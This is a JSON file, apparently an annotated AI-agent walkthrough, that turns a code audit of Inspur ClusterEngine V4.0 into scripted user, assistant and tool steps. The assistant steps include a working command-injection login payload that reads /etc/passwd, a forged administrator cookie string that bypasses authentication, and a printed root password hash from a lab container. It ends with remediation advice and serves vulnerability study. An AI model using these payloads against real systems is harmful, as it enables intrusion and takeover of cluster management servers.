@@ -1,0 +1,119 @@
+{
+  "_source_md": "code-audit/2021-05-21-inspur-Cluster-Engine-V4.0-code-aduit-walkthrough.md",
+  "version": "inspur-Cluster-Engine-V4.0-code-aduit-walkthrough",
+  "title": {
+    "zh": "浪潮ClusterEngine V4.0 代码审计与RCE漏洞分析",
+    "en": "Inspur ClusterEngine V4.0 Code Audit and RCE Vulnerability Analysis"
+  },
+  "description": {
+    "zh": "分析浪潮ClusterEngine V4.0系统的认证绕过和远程代码执行漏洞，包含RCE和Cookie伪造两种攻击方式",
+    "en": "Analyze Inspur ClusterEngine V4.0 authentication bypass and RCE vulnerabilities, including RCE and cookie forgery attack vectors"
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": "分析浪潮ClusterEngine V4.0系统的安全漏洞",
+      "annotation": {
+        "zh": "用户请求代码审计分析",
+        "en": "User requests code audit analysis"
+      },
+      "codeBlocks": [
+        {
+          "caption": { "zh": "", "en": "" },
+          "code": "<servlet>\n    <servlet-name>login</servlet-name>\n    <servlet-class>\n        com.inspur.tsce4.login.Servlet\n    </servlet-class>\n</servlet>",
+          "language": "xml"
+        },
+        {
+          "caption": { "zh": "", "en": "" },
+          "code": "public class Servlet extends HttpServlet {\n    public Servlet() {\n    }\n    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        request.setCharacterEncoding(\"utf-8\");\n        Management manage = new Management(request, response);\n        manage.doResponse();\n    }\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        this.doPost(request, response);\n    }\n}",
+          "language": "java"
+        },
+        {
+          "caption": { "zh": "", "en": "" },
+          "code": "public class Management {\n    \n    HttpServletRequest request;\n    HttpServletResponse response;\n    Command command = new Command();\n\n}",
+          "language": "java"
+        },
+        {
+          "caption": { "zh": "", "en": "" },
+          "code": "uname echo $1 | awk -F \"\" '{for(i=1;i<=NF;i++){if ($i ~ /[a-zA-Z0-9_]/) {str=$i;str1=(str1 str)}}print str1}'\nif [ a\"$uname\"b != a\"$1\"b ]; then\n   echo the user $1 format is illegal\n   echo error:1\n   exit 1;\nfi\n\n#简单做了一个过滤实验，但是一对符号如() ''等都无法过滤\n➜ echo a-d-c.\\/ | awk -F \"\" '{for(i=1;i<=NF;i++){if ($i ~ /[a-zA-Z0-9_]/) {str=$i;str1=(str1 str)}}print str1}'\nadc",
+          "language": "bash"
+        },
+        {
+          "caption": { "zh": "", "en": "" },
+          "code": "➜ docker run -d hjd48/redhat\n➜ docker exec -it c2739bba0d86 /bin/bash\n\n##redhat 6国内换源\nbash-4.1# cd /etc/yum.repos.d/ && mkdir tmp && mv *.repo tmp \nbash-4.1# wget -O /etc/yum.repos.d/CentOS-Base.repo https://static.lty.fun/%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90/SourcesList/Centos-6-Vault-Aliyun.repo\n\n##encrypt 获取过程\nbash-4.1# uname -a\nLinux c2739bba0d86 5.10.25-linuxkit #1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\nbash-4.1# cat /etc/issue\nRed Hat Enterprise Linux Server release 6.3 (Santiago)\nKernel \\r on an \\m\n\nbash-4.1# passwd -S root | sed -rn 's/.* (\\w+) 加密.*/\\1/p'\nSHA512\n\n##用户认证过程\nbash-4.1# bash user_auth.sh root zanghun123\nroot\narootb\narootb\n$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.\nencrypt: SHA512\ns8LxZk5w\npasswd_shadow: $6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.\npasswd_t: $6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.\ntrue",
+          "language": "bash"
+        },
+        {
+          "caption": { "zh": "", "en": "" },
+          "code": "public class Management {\nprivate void getCookie() {\n        String key = this.request.getParameter(\"name\");\n        JSONObject result = new JSONObject();\n        Cookie[] cookies = this.request.getCookies();\n        Cookie cookie = null;\n        Cookie userCookie = null;\n        Cookie L_TIMES_cookie = null;\n        if (cookies != null) {\n            for(int i = 0; i < cookies.length; ++i) {\n                if (cookies[i].getName().equals(key)) {\n                    cookie = cookies[i];\n                } else if (cookies[i].getName().equals(\"username\")) {\n                    userCookie = cookies[i];\n                } else if (cookies[i].getName().equals(\"L_TIMES\")) {\n                    L_TIMES_cookie = cookies[i];\n                }\n            }\n        }\n\n        if (userCookie == null && key.equals(\"username\")) {\n            userCookie = cookie;\n        }\n\n        if (clearUserList.containsKey(userCookie.getValue()) && userCookie != null && key.equals(\"vertifyUser\")) {\n            Long now = (new Date()).getTime();\n            Long addTime = ((Date)clearUserList.get(userCookie.getValue())).getTime();\n            if (now - addTime > 43200000L) {\n                clearUserList.remove(userCookie.getValue());\n            } else if (addTime - Long.parseLong(L_TIMES_cookie.getValue()) > 0L) {\n                Cookie cookieAuth = new Cookie(\"vertifyUser\", \"false\");\n                cookieAuth.setMaxAge(43200);\n                cookieAuth.setPath(\"/\");\n                cookieAuth.setHttpOnly(true);\n                this.response.addCookie(cookieAuth);\n                cookie = null;\n            }\n        }\n\n        try {\n            if (cookie != null) {\n                result.put(\"result\", \"true\");\n                result.put(\"value\", cookie.getValue());\n            } else {\n                result.put(\"result\", \"false\");\n            }\n\n            JsonUtil.respnseJson(this.response, result.toString());\n        } catch (JSONException var10) {\n            JsonUtil.respnseJson(this.response, this.nullResJson.toString());\n        }\n\n    }\n}",
+          "language": "java"
+        }
+      ]
+    },
+    {
+      "type": "assistant_text",
+      "content": "浪潮ClusterEngine V4.0是一款运维管理系统。漏洞CNVD-2021-39845涉及认证逻辑缺陷和远程代码执行。",
+      "annotation": { "zh": "介绍目标系统背景", "en": "Introduce target system background" }
+    },
+    {
+      "type": "tool_call",
+      "content": "查看web.xml中的servlet配置",
+      "toolName": "bash",
+      "annotation": { "zh": "分析Java Web应用结构", "en": "Analyze Java web application structure" }
+    },
+    {
+      "type": "tool_result",
+      "content": "servlet指向com.inspur.tsce4.login.Servlet类，doPost方法调用Management类处理请求",
+      "toolName": "bash",
+      "annotation": { "zh": "确认认证入口点", "en": "Confirm authentication entry point" }
+    },
+    {
+      "type": "user_message",
+      "content": "分析RCE漏洞的触发方式",
+      "annotation": { "zh": "用户请求分析RCE漏洞", "en": "User requests RCE vulnerability analysis" }
+    },
+    {
+      "type": "assistant_text",
+      "content": "RCE漏洞原理：web层传入username和passwd参数，调用bash user_auth.sh进行认证。参数可通过$()、反引号等实现命令注入。",
+      "annotation": { "zh": "解释RCE漏洞原理", "en": "Explain RCE vulnerability mechanism" }
+    },
+    {
+      "type": "tool_call",
+      "content": "构造RCE payload: op=login&username=peiqi`$(cat /etc/passwd)`",
+      "toolName": "bash",
+      "annotation": { "zh": "构造RCE利用payload", "en": "Construct RCE exploitation payload" }
+    },
+    {
+      "type": "system_event",
+      "content": "发送请求后返回命令执行结果，成功读取/etc/passwd内容",
+      "annotation": { "zh": "RCE漏洞利用成功", "en": "RCE vulnerability exploited successfully" }
+    },
+    {
+      "type": "user_message",
+      "content": "分析Cookie伪造漏洞",
+      "annotation": { "zh": "用户请求分析Cookie伪造", "en": "User requests cookie forgery analysis" }
+    },
+    {
+      "type": "assistant_text",
+      "content": "Cookie伪造漏洞：分析getCookie()方法发现认证Cookie没有随机性和时效性，可直接伪造Cookie：lang=cn; username=root; userType=administrator; vertifyUser=true",
+      "annotation": { "zh": "解释Cookie伪造漏洞", "en": "Explain cookie forgery vulnerability" }
+    },
+    {
+      "type": "tool_call",
+      "content": "使用ModHeader等插件直接设置Cookie: lang=cn; username=root; userType=administrator; vertifyUser=true",
+      "toolName": "browser",
+      "annotation": { "zh": "使用Cookie伪造直接登录后台", "en": "Use cookie forgery to login directly" }
+    },
+    {
+      "type": "tool_result",
+      "content": "成功绕过登录验证，直接以管理员身份进入系统后台",
+      "toolName": "browser",
+      "annotation": { "zh": "Cookie伪造利用成功", "en": "Cookie forgery exploitation successful" }
+    },
+    {
+      "type": "assistant_text",
+      "content": "漏洞修复建议：1. 修复bash脚本对特殊字符的过滤逻辑 2. 为Cookie添加随机性和时效性验证 3. 及时更新系统补丁",
+      "annotation": { "zh": "提供修复建议", "en": "Provide remediation recommendations" }
+    }
+  ]
+}
